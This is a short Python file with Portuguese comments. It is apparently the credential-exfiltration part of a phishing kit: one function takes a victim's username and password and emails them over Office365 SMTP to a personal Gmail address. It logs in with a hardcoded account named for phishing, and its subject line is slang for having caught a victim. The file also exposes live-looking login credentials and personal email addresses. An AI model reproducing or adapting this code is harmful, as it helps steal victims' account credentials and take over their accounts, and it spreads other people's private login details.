import smtplib
from email.mime.text import MIMEText

def enviar_email(usuario, senha):
    # Configurar o servidor SMTP
    server = smtplib.SMTP('smtp.office365.com', 587)
    server.starttls()
    server.login('phishingdoscrias@hotmail.com', 'phishing123@')

    # Criar o corpo do e-mail
    mensagem = f'Usuário: {usuario},\n\nSenha: {senha}.'
    assunto = 'Pegamo um véio'

    # Configurar o e-mail
    msg = MIMEText(mensagem)
    msg['Subject'] = assunto
    msg['From'] = 'rafael.martins.rodrigues13@gmail.com'
    msg['To'] = 'rafael.martins.rodrigues13@gmail.com'

    # Enviar o e-mail
    server.sendmail('rafael.martins.rodrigues13@gmail.com', 'rafael.martins.rodrigues13@gmail.com', msg.as_string())

    # Fechar a conexão
    server.quit()